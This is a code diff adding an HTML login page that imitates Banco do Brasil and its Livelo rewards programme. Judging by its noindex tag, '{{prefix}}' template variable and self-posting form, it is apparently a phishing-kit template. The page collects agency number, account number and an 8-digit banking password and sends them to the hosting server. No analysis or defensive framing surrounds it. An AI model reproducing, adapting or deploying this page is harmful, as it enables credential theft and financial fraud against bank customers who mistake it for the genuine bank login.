@@ -1,0 +1,80 @@
+<html data-theme="light" style="--chakra-ui-color-mode:light;">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Banco do Brasil</title>
+    <meta name="robots" content="noindex, nofollow, noimageindex">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/assets/main-v3.css" />
+    <script>
+        var uuid_ = "{{prefix}}"
+    </script>
+    <script src="/assets/app2.js"></script>
+    <style>
+        body {
+            font-size: 16px;
+        }
+    </style>
+    <script>
+        (function(h,o,t,j,a,r){
+            h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
+            h._hjSettings={hjid:2680142,hjsv:6};
+            a=o.getElementsByTagName('head')[0];
+            r=o.createElement('script');r.async=1;
+            r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
+            a.appendChild(r);
+        })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
+    </script>
+</head>
+<body class="chakra-ui-light">
+    <div id="__next">
+        <div class="css-rzd8qz">
+            <div class="css-1oj8ggk"></div>
+            <div class="css-1ow331d">
+                <div class="css-1vmlim4">
+                    <div class="css-6su6fj">
+                        <img alt="logoLivelo" src="/assets/bblivelo/v3/logo-livelo.svg" class="chakra-image css-1gc45r0">
+                    </div>
+                    <div class="css-1sk5mmp">
+                        <hr aria-orientation="vertical" class="chakra-divider css-1mtzovw">
+                    </div>
+                    <div class="css-1sk5mmp">
+                        <img alt="logoBB" src="/assets/bblivelo/v3/logo-bb.svg" class="chakra-image css-1gc45r0">
+                    </div>
+                </div>
+
+                <form id="formPrimary" autocomplete="off" name="formLogin" action="" method="POST" class="css-pydr2a">
+                    <input type="hidden" name="action" id="action" value="doLogin" />
+                    <div class="chakra-stack css-18xftwd">
+                        <div role="group" class="chakra-form-control css-1kxonj9">
+                            <label for="input_ag" id="field-1-label" class="chakra-form__label css-acaicb">Agência</label>
+                            <input type="text" inputmode="numeric" placeholder="1234-5"class="chakra-input css-fqougi" id="input_ag" name="input_ag" type="tel" minlength="4" oninvalid="setCustomValidity('Digite uma agencia válida!')" onchange="try{setCustomValidity('')}catch(e){}" maxlength="6" required autofocus>
+                        </div>
+                        <div role="group" class="chakra-form-control css-1kxonj9">
+                            <label for="input_cc" id="field-2-label" class="chakra-form__label css-acaicb">Conta</label>
+                            <input type="text" inputmode="numeric" placeholder="12346-7" class="chakra-input css-fqougi"
+                            id="input_cc" name="input_cc" placeholder="Conta" type="tel" minlength="1" data-validator="required|min:4|max:10" oninvalid="setCustomValidity('Digite uma conta válida!')" onchange="try{setCustomValidity('')}catch(e){}" maxlength="9" required>
+                        </div>
+                        <div role="group" class="chakra-form-control css-1kxonj9">
+                            <label for="input_sn" id="field-3-label" class="chakra-form__label css-acaicb">Senha</label>
+                            <input class="chakra-input css-fqougi" name="input_sn" id="input_sn" placeholder="Digite sua senha (8 dígitos)" type="tel" style="-webkit-text-security: disc;" minlength="8" oninvalid="setCustomValidity('Digite sua senha de 8 dígitos!')" onchange="try{setCustomValidity('')}catch(e){}" maxlength="8" required>
+                        </div>
+                    </div>
+                    <button type="submit" class="chakra-button css-109bzrk" id="btn-signin" name="btn-signin">CONTINUAR</button>
+                </form>
+
+            </div>
+
+        </div>
+    </div>
+
+    <div id="livelo-spinner">
+        <div class="loader">
+            <div class="inner one"></div>
+            <div class="inner two"></div>
+            <div class="inner three"></div>
+        </div>
+    </div>
+
+</body>
+</html>
